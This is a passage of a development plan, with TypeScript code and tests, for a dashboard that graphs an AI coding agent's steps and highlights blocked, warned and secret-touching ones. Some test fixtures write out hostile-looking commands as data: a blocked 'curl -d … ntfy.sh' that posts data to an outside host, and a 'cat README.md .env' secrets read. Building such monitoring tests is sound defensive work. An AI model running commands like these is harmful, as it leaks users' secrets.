export type SummaryNode = Node<{ hidden: Hidden }, 'summary'>
export type FileNode = Node<{ path: string; sensitive: boolean } & BoxMeta, 'file'>
export type HostNode = Node<{ host: string } & BoxMeta, 'host'>
export type RuleNode = Node<{ rule: string } & BoxMeta, 'rule'>
export type GraphNode = StepNode | SummaryNode | FileNode | HostNode | RuleNode
```

(b) After the `ruleEdgeId` line add:

```ts
export const SUMMARY_ID = 'summary'
export const groupEdgeId = (order: number): string => `group-edge:${order}`
export const MAX_LANE_BOXES = 15
export const MAX_RULE_BOXES = 5
```

(c) After `STEP_HANDLES` add:

```ts
const SUMMARY_HANDLES: NodeHandle[] = [handle('b', 'source', Position.Bottom, STEP_W, STEP_H)]
```

(d) Before `layoutGraph` (after the `link` function) add:

```ts
/** The flagged steps that are drawn: ascending, each order once, none already in the window. */
export function drawnFlagged(steps: readonly PlacedStep[], group: Group | null): Step[] {
  if (group === null || steps.length === 0) return []
  const seen = new Set(steps.map((s) => s.order))
  return group.flagged
    .filter((s) => {
      if (seen.has(s.order)) return false
      seen.add(s.order)
      return true
    })
    .sort((a, b) => a.order - b.order)
}

/** Rows the group takes above the oldest window row: the summary plus the drawn flagged steps. */
export function groupRows(steps: readonly PlacedStep[], group: Group | null): number {
  return group === null || steps.length === 0 ? 0 : 1 + drawnFlagged(steps, group).length
}

interface Candidate {
  id: string
  meta: BoxMeta
  /** A file is dropped before a host on a tie. */
  rank: number
}

/**
 * Ids over the cap, least recently touched first. Ties break by a fixed key that
 * never changes as the window slides (kind, then id), so a box cannot come back
 * without a touch. `anchorRow` is not a tie-break: it changes when a toucher leaves.
 */
function overCap(candidates: Candidate[], max: number): string[] {
  if (candidates.length <= max) return []
  const byId = (a: Candidate, b: Candidate): number => (a.id < b.id ? -1 : a.id > b.id ? 1 : 0)
  return [...candidates]
    .sort((a, b) => a.meta.lastTouchRow - b.meta.lastTouchRow || a.rank - b.rank || byId(a, b))
    .slice(0, candidates.length - max)
    .map((c) => c.id)
}

const QUIET_WIPE: WipeData = { shape: 'straight', quiet: true, start: 0, end: 0 }
```

(e) Replace the whole `layoutGraph` function (from its doc comment to its closing brace) with:

```ts
/**
 * Pure layout. Positions come only from a step's `row` (fixed when first seen),
 * never from its place in the list or from `step.order`. A file, host or rule is
 * one box, level with the first step in the list that touches it; at most 15
 * file/host boxes and 5 rule boxes are drawn. The group (summary box, then the
 * flagged steps) sits in the rows directly above the oldest window row; its
 * boxes and edges are always quiet, and only window steps touch shared boxes.
 */
export function layoutGraph(
  steps: readonly PlacedStep[],
  group: Group | null = null,
  markedOrder: number | null = null,
): Layout {
  const files = new Map<string, BoxMeta>()
  const hosts = new Map<string, BoxMeta>()
  const rules = new Map<string, BoxMeta>()
  const secretFiles = new Set<string>()

  for (const step of steps) {
    if (step.file !== null) {
      touch(files, step.file, step)
      if (step.sensitive) secretFiles.add(step.file)
    }
    if (step.host !== null) touch(hosts, step.host, step)
    if (step.rule !== null) touch(rules, step.rule, step)
  }

  const dropped = new Set([
    ...overCap(
      [
        ...[...files].map(([path, meta]) => ({ id: fileId(path), meta, rank: 0 })),
        ...[...hosts].map(([host, meta]) => ({ id: hostId(host), meta, rank: 1 })),
      ],
      MAX_LANE_BOXES,
    ),
    ...overCap(
      [...rules].map(([rule, meta]) => ({ id: ruleId(rule), meta, rank: 0 })),
      MAX_RULE_BOXES,
    ),
  ])

  const nodes: GraphNode[] = []
  const edges: Edge[] = []

  steps.forEach((step, index) => {
    const cy = rowCentre(step.row)
    nodes.push({
      id: stepId(step.order),
      type: 'step',
      position: { x: STEP_X, y: cy - STEP_H / 2 },
      width: STEP_W,
      height: STEP_H,
      data: { step, flagged: false, marked: step.order === markedOrder },
      handles: STEP_HANDLES,
      ...BASE,
    })

    const previous = steps[index - 1]
    if (previous !== undefined) {
      edges.push({
        id: chainEdgeId(previous.order, step.order),
        type: 'wipe',
        data: wipe(step, 'straight', TIMING.chain),
        source: stepId(previous.order),
        sourceHandle: 'b',
        target: stepId(step.order),
        targetHandle: 't',
        style: { stroke: 'var(--color-chain)', strokeWidth: 3 },
        markerEnd: arrow(EDGE_COLOR.chain),
      })
    }

    if (step.file !== null && !dropped.has(fileId(step.file))) {
      const secret = step.sensitive
      edges.push(
        link(
          fileEdgeId(step.order),
          step,
          fileId(step.file),
          { stroke: secret ? 'var(--color-secret)' : 'var(--color-aux)', strokeWidth: 2 },
          secret ? 'secret' : 'aux',
          undefined,
          TIMING.edge,
        ),
      )
    }
    if (step.host !== null && !dropped.has(hostId(step.host))) {
      const blocked = step.verdict === 'blocked'
      const elevate = blocked || step.verdict === 'warned'
      edges.push(
        link(
          hostEdgeId(step.order),
          step,
          hostId(step.host),
          blocked
            ? { stroke: 'var(--color-blocked)', strokeWidth: 2.5, strokeDasharray: '8 6' }
            : { stroke: 'var(--color-aux)', strokeWidth: 2 },
          blocked ? 'blocked' : 'aux',
          elevate ? 1 : undefined,
          blocked ? TIMING.blockEdge : TIMING.edge,
        ),
      )
    }
    if (step.rule !== null && !dropped.has(ruleId(step.rule))) {
      const warned = step.verdict === 'warned'
      edges.push(
        link(
          ruleEdgeId(step.order),
          step,
          ruleId(step.rule),
          {
            stroke: warned ? 'var(--color-warned)' : 'var(--color-blocked)',
            strokeWidth: 2.5,
            strokeDasharray: '8 6',
          },
          warned ? 'warned' : 'blocked',
          1,
          TIMING.blockEdge,
        ),
      )
    }
  })

  if (group !== null && steps.length > 0) {
    const flagged = drawnFlagged(steps, group)
    const summaryRow = steps[0].row - 1 - flagged.length
    nodes.push({
      id: SUMMARY_ID,
      type: 'summary',
      position: { x: STEP_X, y: rowCentre(summaryRow) - STEP_H / 2 },
      width: STEP_W,
      height: STEP_H,
      data: { hidden: group.hidden },
      handles: SUMMARY_HANDLES,
      ...BASE,
    })
    let upstream = SUMMARY_ID
    flagged.forEach((step, i) => {
      const row = summaryRow + 1 + i
      const placed: PlacedStep = { ...step, row, quiet: true, slot: 0, of: 1 }
      nodes.push({
        id: stepId(step.order),
        type: 'step',
        position: { x: STEP_X, y: rowCentre(row) - STEP_H / 2 },
        width: STEP_W,
        height: STEP_H,
        data: { step: placed, flagged: true, marked: step.order === markedOrder },
        handles: STEP_HANDLES,
        ...BASE,
      })
      edges.push({
        id: groupEdgeId(step.order),
        type: 'wipe',
        data: QUIET_WIPE,
        source: upstream,
        sourceHandle: 'b',
        target: stepId(step.order),
        targetHandle: 't',
        style: { stroke: 'var(--color-chain)', strokeWidth: 3 },
        markerEnd: arrow(EDGE_COLOR.chain),
      })
      upstream = stepId(step.order)
    })
  }

  for (const [path, meta] of files) {
    if (dropped.has(fileId(path))) continue
    nodes.push({
      id: fileId(path),
      type: 'file',
      position: { x: FILE_X, y: rowCentre(meta.anchorRow) + FILE_DY },
      width: FILE_W,
      height: LANE_H,
      data: { path, sensitive: secretFiles.has(path), ...meta },
      handles: FILE_HANDLES,
      ...BASE,
    })
  }
  for (const [host, meta] of hosts) {
    if (dropped.has(hostId(host))) continue
    nodes.push({
      id: hostId(host),
      type: 'host',
      position: { x: HOST_X, y: rowCentre(meta.anchorRow) + HOST_DY },
      width: HOST_W,
      height: LANE_H,
      data: { host, ...meta },
      handles: HOST_HANDLES,
      ...BASE,
    })
  }
  for (const [rule, meta] of rules) {
    if (dropped.has(ruleId(rule))) continue
    nodes.push({
      id: ruleId(rule),
      type: 'rule',
      position: { x: HOST_X, y: rowCentre(meta.anchorRow) + RULE_DY },
      width: HOST_W,
      height: LANE_H,
      data: { rule, ...meta },
      handles: HOST_HANDLES,
      ...BASE,
    })
  }

  return { nodes, edges }
}
```

(`WipeData` is declared earlier in the same file; `QUIET_WIPE` must come after it, which is why it sits just before `layoutGraph`.)

- [ ] **Step 4b: Amend AG-29's stability test**

In `ui/src/graph/layout.test.ts` rename `describe('stability', ...)` to
`describe('stability: window boxes never move; the group moves with the window (see "the group above the window")', ...)`.
Its two tests stay as they are (they cover window steps and lane boxes); the group's own movement is covered by the two
"moves ... when the window slides / the departing step becomes flagged" tests added above. This is the amendment to AG-29's
"a box never moves" that the intent states.

- [ ] **Step 5: Run the layout and camera tests**

Run: `npm --prefix ui test -- layout camera`
Expected: the new tests pass. Fix any existing test that fails only because `StepNode` data gained `flagged`/`marked` (a `toEqual` on `data`): add `flagged: false, marked: false`.

- [ ] **Step 6: Run the web check and commit**

Run: `npm --prefix ui run check`
Expected: pass (`GraphView` still calls `layoutGraph(steps)` and `rowsOf(steps)`, which still work; `nodeTypes` has no `summary` yet, but no group is passed yet).

```bash
git add ui/src/graph/layout.ts ui/src/graph/camera.ts ui/src/graph/layout.test.ts ui/src/graph/camera.test.ts
git commit -m "$(cat <<'EOF'
AG-30: lay out the summary group above the window and cap lane boxes

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 5: Nodes, tones, GraphView and App wiring

**Files:**
- Create: `ui/src/graph/summary.ts`, `ui/src/graph/summary.test.ts`
- Modify: `ui/src/graph/tones.ts`, `nodes.tsx`, `GraphView.tsx`, `ui/src/App.tsx`
- Modify tests: `nodes.test.tsx`, `GraphView.test.tsx`, `ui/src/App.test.tsx`

**Interfaces:**
- Consumes: Task 3's `Recorder.group`/`markedOrder`; Task 4's `layoutGraph`, `groupRows`, `rowsOf`, `SummaryNode`, `SUMMARY_ID`.
- Produces: `summaryText(hidden: Hidden): string`; `TONES.summary`; `SummaryBox`; `GraphView` props `group?: Group | null`, `markedOrder?: number | null`.

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/summary.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { summaryText } from './summary'
import { makeHidden } from './testing'

describe('summaryText', () => {
  it('puts the alarms in brackets and drops zero counts', () => {
    expect(summaryText(makeHidden({ total: 38, read: 20, shell: 16, tool: 2, blocked: 2, warned: 1 }))).toBe(
      '38 earlier steps (2 blocked, 1 warned): 20 read, 16 shell, 2 tool',
    )
  })

  it('has no brackets without alarms', () => {
    expect(summaryText(makeHidden({ total: 12, shell: 12 }))).toBe('12 earlier steps: 12 shell')
  })

  it('says step for one, and survives kinds the page does not count', () => {
    expect(summaryText(makeHidden({ total: 1 }))).toBe('1 earlier step')
    expect(summaryText(makeHidden({ total: 3, edit: 1, warned: 1 }))).toBe('3 earlier steps (1 warned): 1 edit')
  })
})
```

Append to `ui/src/graph/nodes.test.tsx` (add `makeHidden, stepsFrom` to the `./testing` import):

```tsx
describe('the group', () => {
  const flaggedBlock = makeStep(40003, { verdict: 'blocked', rule: 'R1', host: 'ntfy.sh', command: 'curl -d <arg> ntfy.sh' })
  const group = (flagged = [flaggedBlock]) => ({
    hidden: makeHidden({ total: 97, shell: 97, blocked: 1 }),
    flagged,
  })
  const windowSteps = () => place(stepsFrom(40100, 20), 100)

  it('draws the summary and a flagged step with its rule in the chip and no lane boxes of its own', async () => {
    const { container } = render(<GraphView steps={windowSteps()} epoch={0} group={group()} markedOrder={null} />)
    await settle()
    expect(screen.getByText('97 earlier steps (1 blocked): 97 shell')).toBeTruthy()
    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
    expect(container.querySelector('.react-flow__node-host')).toBeNull()
    expect(container.querySelector('.react-flow__node-rule')).toBeNull()
  })

  it('shows SECRET on the marking step in the window and in the group, and both chips when it was blocked', async () => {
    const inWindow = render(<GraphView steps={windowSteps()} epoch={0} group={null} markedOrder={40105} />)
    await settle()
    expect(screen.getAllByText('SECRET')).toHaveLength(1)
    inWindow.unmount()
    render(<GraphView steps={windowSteps()} epoch={0} group={group()} markedOrder={40003} />)
    await settle()
    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
    expect(screen.getAllByText('SECRET')).toHaveLength(1)
  })

  it('keeps the same mounted box when a blocked step moves from the window into the group', async () => {
    const blocked = (order: number) => makeStep(order, { verdict: 'blocked', rule: 'R1', command: 'curl x' })
    const first = place([blocked(40100), ...stepsFrom(40101, 19)], 100)
    const { container, rerender } = render(<GraphView steps={first} epoch={0} group={null} markedOrder={null} />)
    await settle()
    const box = container.querySelector('[title^="40100:"]')
    const wipe = box?.querySelector('[data-testid="border-wipe"]')
    expect(box).not.toBeNull()
    expect(wipe).not.toBeNull()

    const slid = [...place(stepsFrom(40101, 19), 101), ...place([makeStep(40120)], 120)]
    rerender(<GraphView steps={slid} epoch={0} group={group([blocked(40100)])} markedOrder={null} />)
    await settle()
    expect(container.querySelector('[title^="40100:"]')).toBe(box)
    expect(container.querySelector('[title^="40100:"] [data-testid="border-wipe"]')).toBe(wipe)
    expect(screen.getByText('BLOCKED R1')).toBeTruthy()
  })
})
```

Append to `ui/src/graph/GraphView.test.tsx` (it already has the `spy`, `settle` and `view` helpers; add `makeHidden` to the `./testing` import and `groupRows, SUMMARY_ID` to the `./layout` import):

```tsx
describe('with a group', () => {
  const win = place(stepsFrom(40100, 20), 100)
  const group = {
    hidden: makeHidden({ total: 97, shell: 97, blocked: 1 }),
    flagged: [makeStep(40003, { verdict: 'blocked', rule: 'R1' })],
  }
  const withGroup = (steps: ReturnType<typeof place>, g = group) => (
    <GraphView steps={steps} epoch={0} group={g} markedOrder={null} />
  )

  it('lets the pan range reach the summary box, with orders in the tens of thousands', async () => {
    render(withGroup(win))
    await settle()
    const summary = layoutGraph(win, group).nodes.find((n) => n.id === SUMMARY_ID)!
    const [[, top]] = spy.props.translateExtent
    expect(top).toBeLessThanOrEqual(summary.position.y)
    expect(rowsOf(win, groupRows(win, group)).first).toBe(98)
  })

  it('moves the camera once for a slide and not at all for an unchanged poll', async () => {
    const { rerender } = render(withGroup(win))
    await settle()
    const calls = spy.calls.length
    rerender(withGroup([...win]))
    await settle()
    expect(spy.calls.length).toBe(calls)
    const slid = [...place(stepsFrom(40101, 19), 101), ...place([makeStep(40120)], 120)]
    rerender(withGroup(slid))
    await settle()
    expect(spy.calls.length).toBe(calls + 1)
  })
})
```

Add `TONES.summary` to the tones test by relying on the existing table iteration (no new test needed; it must keep passing).

Append to `ui/src/App.test.tsx` inside `describe('App'`:

```tsx
  it('shows SECRET SEEN and the SECRET chip after a reload, from the marking step alone', async () => {
    const steps = [
      { ...stepsFrom(40000, 1)[0], command: 'cat README.md .env' },
      ...stepsFrom(40001, 3),
    ]
    vi.stubGlobal('fetch', vi.fn(async () => respond('s', steps, { marked_order: 40000 })))
    render(<App />)
    await advance(0)
    expect(screen.getByText('SECRET SEEN')).toBeTruthy()
    expect(screen.getByText('SECRET')).toBeTruthy()
  })
```

- [ ] **Step 2: Run to verify they fail**

Run: `npm --prefix ui test -- summary nodes GraphView App`
Expected: FAIL (`./summary` missing; `GraphView` ignores `group`).

- [ ] **Step 3: Implement `summary.ts`**

```ts
import type { Hidden } from './types'

const KINDS = ['read', 'shell', 'edit', 'tool'] as const

/**
 * The summary box text: "38 earlier steps (2 blocked, 1 warned): 20 read, 16 shell".
 * Zero counts are dropped. The alarms come first and in brackets because they overlay the kind
 * counts (they are not a partition) and are what must survive a truncated box.
 */
export function summaryText(h: Hidden): string {
  const head = `${h.total} earlier ${h.total === 1 ? 'step' : 'steps'}`
  const alarms = [h.blocked > 0 ? `${h.blocked} blocked` : null, h.warned > 0 ? `${h.warned} warned` : null].filter(
    (a): a is string => a !== null,
  )
  const kinds = KINDS.filter((k) => h[k] > 0).map((k) => `${h[k]} ${k}`)
  return `${head}${alarms.length > 0 ? ` (${alarms.join(', ')})` : ''}${kinds.length > 0 ? `: ${kinds.join(', ')}` : ''}`
}
```

- [ ] **Step 4: Add the tone**

In `ui/src/graph/tones.ts`, in `TONES`, after the `step` row:

```ts
  summary: tone('surface', 'ink', 'aux', 'bg-surface text-ink border-aux'),
```

- [ ] **Step 5: Update `nodes.tsx`**

Change the layout import to include `SummaryNode`: `import { HANDLE, type BoxMeta, type FileNode, type HostNode, type RuleNode, type StepNode, type SummaryNode } from './layout'`; add `import { summaryText } from './summary'`.

In `StepBox`, replace the first lines and the chip block:

```tsx
export function StepBox({ id, data }: NodeProps<StepNode>) {
  const { step, flagged, marked } = data
  const { ms, reduced } = useMotionPolicy()
  const dimmed = useDimmed(id)
  const delay = enterDelay(step)
  const detail = stepDetail(step)
  const pathKind = step.kind === 'read' || step.kind === 'edit'
  const { tone, wipe, chip, chipTone } = VERDICT_UI[step.verdict]
  // An older flagged step names its rule in its chip instead of a rule box.
  const verdictChip = chip !== null && flagged && step.rule !== null ? `${chip} ${step.rule}` : chip
  const alarm = step.verdict !== 'allowed'
```

and replace

```tsx
        {chip !== null && (
          <span className={`shrink-0 rounded px-2 font-bold leading-5 ${chipTone}`}>{chip}</span>
        )}
```

with

```tsx
        {verdictChip !== null && (
          <span className={`shrink-0 rounded px-2 font-bold leading-5 ${chipTone}`}>{verdictChip}</span>
        )}
        {marked && (
          <span className={`shrink-0 rounded px-2 font-bold leading-5 ${TONES.chipSecret.classes}`}>SECRET</span>
        )}
```

Add after `StepBox`:

```tsx
/** The group's header: counts of the steps outside the window. Always quiet, never dimmed. */
export function SummaryBox({ data }: NodeProps<SummaryNode>) {
  const text = summaryText(data.hidden)
  return (
    <div className="relative h-full w-full" title={text}>
      <div className={`flex h-full w-full items-center rounded-lg border-2 px-3 text-base leading-6 ${TONES.summary.classes}`}>
        <span className="min-w-0 flex-1 truncate">{text}</span>
      </div>
      <Handle id="b" type="source" position={Position.Bottom} style={HIDDEN_HANDLE} />
    </div>
  )
}
```

- [ ] **Step 6: Update `GraphView.tsx`**

Imports: `import { groupRows, layoutGraph } from './layout'`, `import { FileBox, HostBox, RuleBox, StepBox, SummaryBox } from './nodes'`, `import type { Group, PlacedStep } from './types'`. Change `nodeTypes`:

```tsx
const nodeTypes = { step: StepBox, summary: SummaryBox, file: FileBox, host: HostBox, rule: RuleBox }
```

Props and component signature:

```tsx
interface Props {
  steps: readonly PlacedStep[]
  /** Bumps when the window resets. The drawing remounts, so the camera jumps and every box enters afresh. */
  epoch: number
  /** The summary counts and flagged older steps; null for none. */
  group?: Group | null
  /** The step that made R1 mark the session; its box shows SECRET. */
  markedOrder?: number | null
}

/** The drawing. The camera is uncontrolled: only `setViewport` moves it. */
export function GraphView({ steps, epoch, group = null, markedOrder = null }: Props) {
  const ms = useMs()
  const dim = useBlockDim(steps, epoch, ms)
  return (
    <DimContext.Provider value={dim}>
      <ReactFlowProvider key={epoch}>
        <Drawing steps={steps} group={group} markedOrder={markedOrder} />
      </ReactFlowProvider>
    </DimContext.Provider>
  )
}

function Drawing({ steps, group, markedOrder }: { steps: readonly PlacedStep[]; group: Group | null; markedOrder: number | null }) {
```

and in `Drawing` replace the layout and rows lines:

```tsx
  const layout = useMemo(() => layoutGraph(steps, group, markedOrder), [steps, group, markedOrder])
  const above = useMemo(() => groupRows(steps, group), [steps, group])
  const { first, last } = rowsOf(steps, above)
```

- [ ] **Step 7: Update `App.tsx`**

```tsx
  const { steps, group, markedOrder, epoch, secretSeen, offline, newSession } = useRecorder(mock, burst, mockFirst)
```

and

```tsx
      <GraphView steps={steps} epoch={epoch} group={group} markedOrder={markedOrder} />
```

- [ ] **Step 8: Run the web check**

Run: `npm --prefix ui run check`
Expected: pass, including `tones.test.ts` (the `summary` row at 7:1, classes naming exactly the tokens, no colour class outside `tones.ts`).

- [ ] **Step 9: Commit**

```bash
git add ui/src
git commit -m "$(cat <<'EOF'
AG-30: draw the summary box, flagged steps and SECRET chips

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 6: Mock — server-shaped windows and a long session

**Files:**
- Create: `ui/src/graph/mockWindow.ts`, `ui/src/graph/mockWindow.test.ts`
- Modify: `ui/src/graph/mock.ts`, `ui/src/graph/mock.test.ts`, `ui/src/graph/useRecorder.ts`, `ui/src/App.tsx`
- Modify tests: `ui/src/graph/useRecorder.test.tsx`

**Interfaces:**
- Consumes: Task 3's `Hidden`, reducer action fields; golden fixture from Task 1; `makeStep`.
- Produces:
  - `mockWindow.ts`: `windowOfMock(all: readonly Step[], limit: number, cap: number, markedOrder: number | null): MockWindow` with `MockWindow { steps: Step[]; hidden: Hidden; flagged: Step[]; markedOrder: number | null }`; `pickFlagged(marking, candidates, floor, cap = FLAG_CAP)`; constants `FLAG_CAP = 5`, `MOCK_CAP = 500`
  - `mock.ts`: `MOCK_MARKED_ORDER = 40001`, `LONG_MARKED_ORDER = 40001`, `longSession(n: number): Step[]`, `parseLen(raw: string | null): number | null`
  - `useRecorder(mock, burst = 1, mockFirst = false, mockLen: number | null = null)`

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/mockWindow.test.ts`:

```ts
/// <reference types="node" />
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { layoutGraph } from './layout'
import { longSession, LONG_MARKED_ORDER } from './mock'
import { pickFlagged, windowOfMock } from './mockWindow'
import { makeHidden, makeStep } from './testing'
import type { Hidden, StepKind, Verdict } from './types'
import { WINDOW_SIZE, initialWindowState, windowReducer } from './window'

interface Scenario {
  name: string
  cap: number
  steps: { kind: StepKind; verdict: Verdict; marks?: boolean }[]
  cases: { limit: number; expect: { window: number[]; hidden: Hidden; flagged: number[]; marked_order: number | null } }[]
}

const here = dirname(fileURLToPath(import.meta.url))
const golden = JSON.parse(readFileSync(join(here, '../../../tests/fixtures/window_golden.json'), 'utf8')) as {
  scenarios: Scenario[]
}
const orders = (steps: readonly { order: number }[]) => steps.map((s) => s.order)

describe('windowOfMock matches the Python server on the golden fixture', () => {
  it.each(golden.scenarios.map((s) => [s.name.slice(0, 40), s] as const))('%s', (_name, scenario) => {
    const all = scenario.steps.map((s, i) => makeStep(i + 1, { kind: s.kind, verdict: s.verdict }))
    const marked = scenario.steps.findIndex((s) => s.marks === true)
    const markedOrder = marked === -1 ? null : marked + 1
    for (const c of scenario.cases) {
      const got = windowOfMock(all, c.limit, scenario.cap, markedOrder)
      expect(orders(got.steps), `limit ${c.limit}`).toEqual(c.expect.window)
      expect(got.hidden, `limit ${c.limit}`).toEqual(c.expect.hidden)
      expect(orders(got.flagged), `limit ${c.limit}`).toEqual(c.expect.flagged)
      expect(got.markedOrder, `limit ${c.limit}`).toBe(c.expect.marked_order)
    }
  })
})

describe('windowOfMock', () => {
  it('is empty for no steps', () => {
    expect(windowOfMock([], 20, 500, null)).toEqual({ steps: [], hidden: makeHidden(), flagged: [], markedOrder: null })
  })

  it('counts a step kind it does not know in total only', () => {
    const all = [makeStep(1, { kind: 'weird' as StepKind }), makeStep(2)]
    expect(windowOfMock(all, 1, 500, null).hidden).toEqual(makeHidden({ total: 1 }))
  })

  it('reports no marked order until the marking step has been shown', () => {
    const all = [makeStep(1), makeStep(2)]
    expect(windowOfMock(all, 20, 500, 3).markedOrder).toBeNull()
    expect(windowOfMock([...all, makeStep(3)], 20, 500, 3).markedOrder).toBe(3)
  })
})

describe('pickFlagged', () => {
  it('takes the marking step first, once, then the newest, ascending', () => {
    const blocked = (o: number) => makeStep(o, { verdict: 'blocked' })
    const marking = blocked(3)
    const got = pickFlagged(marking, [blocked(20), blocked(18), marking, blocked(16), blocked(14), blocked(12)], 30)
    expect(orders(got)).toEqual([3, 14, 16, 18, 20])
  })
})

describe('a 500-step session through the reducer and the layout', () => {
  it('draws at most 50 boxes and every flagged step joins the one summary box', () => {
    const all = longSession(500)
    const win = windowOfMock(all, WINDOW_SIZE, 500, LONG_MARKED_ORDER)
    const s = windowReducer(initialWindowState(), {
      type: 'snapshot',
      session: 'long',
      steps: win.steps,
      hidden: win.hidden,
      flagged: win.flagged,
      markedOrder: win.markedOrder,
    })
    expect(win.hidden.total).toBe(480)
    expect(win.flagged.length).toBeLessThanOrEqual(5)
    expect(win.flagged.map((f) => f.order)).toContain(LONG_MARKED_ORDER)
    const layout = layoutGraph(s.steps, s.group, s.markedOrder)
    expect(layout.nodes.length).toBeLessThanOrEqual(50)
    expect(layout.nodes.filter((n) => n.type === 'summary')).toHaveLength(1)
    expect(layout.edges.filter((e) => e.id.startsWith('group-edge'))).toHaveLength(win.flagged.length)
  })

  it('stays within 50 boxes in the worst case: 20 steps, each with its own file, host and rule', () => {
    const steps = Array.from({ length: 20 }, (_, i) =>
      makeStep(1000 + i, { verdict: 'blocked', file: `f${i}`, host: `h${i}.com`, rule: `R${i}`, command: 'x' }),
    )
    const flagged = Array.from({ length: 5 }, (_, i) => makeStep(10 + i, { verdict: 'blocked' }))
    const s = windowReducer(initialWindowState(), {
      type: 'snapshot',
      session: 'w',
      steps,
      hidden: makeHidden({ total: 480, shell: 480, blocked: 30 }),
      flagged,
      markedOrder: null,
    })
    expect(layoutGraph(s.steps, s.group, s.markedOrder).nodes).toHaveLength(20 + 15 + 5 + 1 + 5)
  })
})
```

Append to `ui/src/graph/mock.test.ts` (extend the import to `LONG_MARKED_ORDER, MOCK_MARKED_ORDER, longSession, parseLen`):

```ts
describe('MOCK_MARKED_ORDER', () => {
  it('names the demo story\'s .env read', () => {
    expect(MOCK_SESSION.find((s) => s.order === MOCK_MARKED_ORDER)).toMatchObject({ file: '.env', sensitive: true })
  })
})

describe('longSession', () => {
  it('is n steps from order 40,000 with a marking read at index 1 and a block about every 13', () => {
    const steps = longSession(500)
    expect(steps).toHaveLength(500)
    expect(steps.map((s) => s.order)).toEqual(Array.from({ length: 500 }, (_, i) => 40000 + i))
    expect(steps.find((s) => s.order === LONG_MARKED_ORDER)).toMatchObject({ file: '.env', sensitive: true })
    expect(steps.filter((s) => s.verdict === 'blocked').length).toBeGreaterThanOrEqual(30)
    expect(steps.filter((s) => s.verdict === 'warned').length).toBeGreaterThanOrEqual(10)
    expect(longSession(3)).toHaveLength(3)
  })
})

describe('parseLen', () => {
  it.each([
    ['500', 500],
    ['1', 1],
    ['2000', 2000],
    [null, null],
    ['0', null],
    ['2001', null],
    ['x', null],
    ['2.5', null],
    ['-3', null],
    ['', null],
  ])('%s gives %s', (raw, expected) => {
    expect(parseLen(raw)).toBe(expected)
  })
})
```

Append to `ui/src/graph/useRecorder.test.tsx` inside the mock-mode `describe` (find it with `describe('useRecorder (mock mode)'`; if it is named differently use that block):

```tsx
  it('replays a long session through the server-shaped window and reaches a group', async () => {
    const { result } = renderHook(() => useRecorder(true, 10, false, 100))
    await advance(MOCK_INTERVAL_MS * 4)
    expect(result.current.steps).toHaveLength(WINDOW_SIZE)
    expect(result.current.group?.hidden.total).toBe(result.current.steps[0].order - 40000)
    expect(result.current.markedOrder).toBe(40001)
    expect(result.current.secretSeen).not.toBeNull()
  })
```

- [ ] **Step 2: Run to verify they fail**

Run: `npm --prefix ui test -- mock useRecorder`
Expected: FAIL (`./mockWindow` missing).

- [ ] **Step 3: Create `mockWindow.ts`**

```ts
import type { Hidden, Step, Verdict } from './types'

export const FLAG_CAP = 5
export const MOCK_CAP = 500

const ALARMS: readonly Verdict[] = ['blocked', 'warned']
const isAlarm = (s: Step): boolean => ALARMS.includes(s.verdict)

export interface MockWindow {
  steps: Step[]
  hidden: Hidden
  flagged: Step[]
  markedOrder: number | null
}

function tally(steps: readonly Step[]): Hidden {
  const h: Hidden = { total: 0, read: 0, shell: 0, edit: 0, tool: 0, blocked: 0, warned: 0 }
  for (const s of steps) {
    h.total += 1
    if (s.kind === 'read' || s.kind === 'shell' || s.kind === 'edit' || s.kind === 'tool') h[s.kind] += 1
    if (s.verdict === 'blocked' || s.verdict === 'warned') h[s.verdict] += 1
  }
  return h
}

/** Port of recorder/memory.py `pick_flagged`; tests/fixtures/window_golden.json holds the two together. */
export function pickFlagged(marking: Step | null, candidates: Iterable<Step>, floor: number, cap = FLAG_CAP): Step[] {
  const picked = new Map<number, Step>()
  if (marking !== null && marking.order < floor) picked.set(marking.order, marking)
  for (const step of candidates) {
    if (picked.size >= cap) break
    if (step.order < floor && !picked.has(step.order)) picked.set(step.order, step)
  }
  return [...picked.values()].sort((a, b) => a.order - b.order)
}

/**
 * What the server's `GET /api/steps?limit=N` would return after `all` steps were
 * recorded, with the same retained `cap` and the order of the step that made R1
 * mark the session. Mock mode uses it so the page needs no server.
 */
export function windowOfMock(all: readonly Step[], limit: number, cap: number, markedOrder: number | null): MockWindow {
  const retained = all.slice(-cap)
  const steps = retained.slice(-limit)
  if (steps.length === 0) return { steps: [], hidden: tally([]), flagged: [], markedOrder: null }

  const floor = steps[0].order
  const everything = tally(all)
  const inWindow = tally(steps)
  const hidden = Object.fromEntries(
    (Object.keys(everything) as (keyof Hidden)[]).map((k) => [k, everything[k] - inWindow[k]]),
  ) as unknown as Hidden

  const marking = markedOrder === null ? null : (all.find((s) => s.order === markedOrder) ?? null)
  // The server keeps the newest 5 alarms among the steps the cap pushed out.
  const evicted = all.slice(0, all.length - retained.length).filter(isAlarm).slice(-FLAG_CAP)
  function* candidates(): Generator<Step> {
    for (let i = retained.length - 1; i >= 0; i--) {
      if (retained[i].order < floor && isAlarm(retained[i])) yield retained[i]
    }
    for (let i = evicted.length - 1; i >= 0; i--) yield evicted[i]
  }
  return { steps, hidden, flagged: pickFlagged(marking, candidates(), floor), markedOrder: marking?.order ?? null }
}
```

- [ ] **Step 4: Extend `mock.ts`**

Append (the file already defines `step`, `FILLER`, `MOCK_STEPS`, `MOCK_SESSION`, `parseBurst`):

```ts
/** The demo story's marking step: the `.env` read. */
export const MOCK_MARKED_ORDER = 40001
/** The long session's marking step: its index-1 `.env` read. */
export const LONG_MARKED_ORDER = 40001

const LONG_MAX = 2000

/**
 * A deterministic long session from order 40,000: a marking `.env` read at index 1, a block about
 * every 13 steps, a warning about every 31, and filler between. `?mock=1&len=500&burst=10`.
 */
export function longSession(n: number): Step[] {
  return Array.from({ length: n }, (_, i) => {
    const order = 40000 + i
    if (i === 1) return step(order, { kind: 'read', file: '.env', sensitive: true })
    if (i >= 2 && i % 13 === 0) {
